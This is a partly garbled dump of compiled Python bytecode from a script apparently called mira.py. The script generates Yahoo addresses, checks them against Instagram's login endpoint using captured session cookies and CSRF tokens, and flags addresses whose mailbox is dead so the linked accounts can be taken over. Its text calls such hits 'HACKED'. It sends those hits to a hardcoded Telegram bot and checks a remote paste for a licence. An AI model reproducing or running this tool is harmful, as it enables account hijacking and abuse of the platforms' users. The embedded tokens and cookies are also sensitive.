a
    S B`�.  �                   @   s  d dl Z d dlZd dlZd dlZd dlZdadZdZddddd	d
dddddd�addddddddddddddddd
dd�Z	d dd!dd"d#d$d%d&dddd
d'd(d)�Z
d Zd Zd Zd Zd Zd Zd*dd+ddddd,d-d.d/d0ddd
d1d2d3d4d5dd6�ad7d8� Zd9d:� Zd;d<� Ze�  e�  e�  e�  dS )=�    Nz.https://www.instagram.com/accounts/login/ajax/z3https://accounts.snapchat.com/accounts/merlin/loginz/https://checkeremail.com/checker-validation.php�	mmo69.com�
keep-alive�*/*�XMLHttpRequest��Mozilla/5.0 (Linux; U; Android 10; en-gb; Redmi Note 8 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.9.3-gn�same-origin�cors�-https://mmo69.com/_check_live_email/index.php�gzip, deflate, br�en-GB,en-US;q=0.9,en;q=0.8�$PHPSESSID=rfko1se9ej41kgvu75n928dlk4��Host�
Connection�AcceptzX-Requested-With�
User-Agent�Sec-Fetch-Site�Sec-Fetch-Mode�Referer�Accept-Encoding�Accept-Language�Cookie�checkeremail.comZPOSTz/checker-validation.phpZhttpsz#en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7Z95z0application/x-www-form-urlencoded; charset=UTF-8z�_ga=GA1.2.1471562489.1614863440; _gid=GA1.2.684605021.1614863440; __gads=ID=a1bcba717fdb8632-223b19b3a4ba0075:T=1614863440:RT=1614863440:S=ALNI_MaFgeAIKcRYM1dWH5VZfpgFzsGAXwzhttps://checkeremail.comzhttps://checkeremail.com/z>Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99z?0�emptyzqMozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36)�	authority�method�path�scheme�accept�accept-encoding�accept-language�content-length�content-type�cookie�origin�refererz	sec-ch-uazsec-ch-ua-mobile�sec-fetch-dest�sec-fetch-mode�sec-fetch-site�
user-agentz!application/json, text/plain, */*zen-US,en;q=0.9Z52zapplication/jsonz�xsrf_token=QK7s5rxRe7oOj0SCQ6r4QQ; sc-language=en-US; web_client_id=2072def6-3323-4f28-bbec-139aecae1365; sc-cookies-accepted=true; Preferences=true; Performance=true; Marketing=true; _ga=GA1.2.406717891.1614220698; _gid=GA1.2.110948618.1614220698zaccounts.snapchat.comzhttps://accounts.snapchat.comziMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36ZQK7s5rxRe7oOj0SCQ6r4QQ)r   r   r   r   zContent-LengthzContent-Typer   r   ZOriginr   zSec-Fetch-Destr   r   r   zX-XSRF-TOKENzwww.instagram.comz/accounts/login/ajax/Z277z!application/x-www-form-urlencodedz�ig_did=D9AD55FF-D40F-4569-8F3D-72923D6B496D; mid=X-oMXwAEAAFsGP-VB_KrvTNjqpMV; ig_nrcb=1; datr=lbztX-QwAT9uM6uzLDWzbgof; fbm_124024574287414=base_domain=.instagram.com; ds_user_id=45246725385; csrftoken=u27l2skXxXS3smNyYh7bYQ7GZeC39zq5zhttps://www.instagram.comz)https://www.instagram.com/accounts/login/zrMozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36Z u27l2skXxXS3smNyYh7bYQ7GZeC39zq5Z936619743392459�0Z7a3a3e64fa87)r   r   r   r   r   r   r    r!   r"   r#   r$   r%   r&   r'   r(   r)   zx-csrftokenzx-ig-app-idzx-ig-www-claimzx-instagram-ajaxzx-requested-withc            
      C   s�   t �d� td� td� td� td� td� td� td� td� td� g } tdd�}td�}td�D ]P}d	}|}t�|�}t�|�}t�|�}|| | }|| d
 }	|�|	d � qpd S )N�clear� zTkaya Nawek bnusa !z------------�	email.txt�wzname :��   Z10928374659430183274658z
@yahoo.com�
)	�os�system�print�open�input�range�randomZchoice�write)
�hZahmaw�name�x�tZx1Zx2Zx3ZhamwiZani� r=   �mira.py�email�   s,    




r?   c                  C   s�  t �d� t�d� tdd��� } d}d}d}d}d}d}| D �]�}t �d� |�� }|ddd	d
�}	d|d�}
|dddd�}|�� }tjt	t
|d�j}d|v �rVt�d� |d7 }td� td� td� td� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� d|v �r4t �d� d}t�|�}t �d� d �|�}d!d"d#d$d%d&d'dd(d)d*d+�atj|td,�j}d-|v �r�t�d� |d7 }td� td� td� td� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� d.}|| d/ }d0}d1}d2| d3 | d4 | }t�|�}d5|v �rrt�d� |d7 }td� td� td� td� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� d6|v �r�t�d� |d7 }td� td� td� td� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� q>t�d� |d7 }td� td� td� td� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� td� td�|�� q>d S )7N�   r+   r-   �rr   �   Z0fjmpiezakn4szlrwipvr   zexample@gmail.com)ZemZchZhlZfrmZBITMOJI_APP)Zappr?   z�#PWD_INSTAGRAM_BROWSER:10:1613910809:AZJQALDAleQsUwvq5s+tkCBrrlExq5b+/Gkk98iK8p26YHcVdbjMGONMoenLyrpwurfjtiLwd7T21klGL+lJO65ow22AdoYpNZjaesulmojmAzXwx7E2CqMNFUKxGiF5/a/p8M7NAfv+RcvvE8E=z{}Zfalse)ZusernameZenc_passwordZqueryParamsZoptIntoOneTap)�headers�dataz"user":truez[ + ] ALL EMAIL 200 !r,   z----------------u   [ ✓ ] TRUE INSTAGRAM : {}z------z[ x ] NOT TRUE : {}u   [ ✓ ] EMAIL HACKED : {}z-------z[ x ] NOT HACKED : {} z[ ! ] ERORR CHECK : {}u#   [ ✓ ] SEND EMAIL FOR TELGRAM : {}�   r	   z4https://mmo69.com/_check_live_email/api.php?email={}r   r   r   r   r   r   r   r
   r   r   r   )ZurlrC   ZDIEz%instagram : danyar.software

Email : z"

INSTAGEAM : TRUE 

HACK : TRUE 
z.1602282060:AAH8NJmYFPpF3wlN6oEWoUYkOk5HrcNVy1QZ
1615347852zhttps://api.telegram.org/botz/sendMessage?chat_id=z&parse_mode=Markdown&text=ZLIVEz https://www.facebook.com/hkvn9x/)�time�sleepr1   r2   r4   �	readlines�strip�requestsZpost�	url_insta�
head_insta�textr3   �format�get�headd)Zfiler�a�b�c�d�e�mr;   �uZdata_hotmailZ	data_snaprD   �reZsarataZbneraZurllZreer:   Zbot_messageZ	bot_tokenZ
bot_chatIDZ	send_textZresponser=   r=   r>   �cheker_insta�   s$   



���






�







rY   c                  C   s�   t t�� �t t�� � } d�| �}td| � zRt�d�j}||v rdtd� t t�� �}t	�
d� ntd� t	�
d� t��  W n$   t��  tdkr�tt� Y n0 d S )N�-z[37;1mYour ID : z"https://textuploader.com/187w2/rawz![37;1mYOUR ID IS ACTIVE.........r@   z%[37;1mYOUR ID IS NOT ACTIVE.........�__main__)�strr1   �geteuid�getlogin�joinr3   rJ   rO   rM   rF   rG   �sys�exitr:   Zlogo)Zuuid�idZhttpCaht�msgr=   r=   r>   �chku  s"    


rd   )r1   rJ   r7   r`   rF   rK   Zurl_snapZurl_hotmailrP   rC   Zheaders_snaprQ   rR   rS   rT   rU   rV   rL   r?   rY   rd   ra   r=   r=   r=   r>   �<module>   s�   ��$��$ D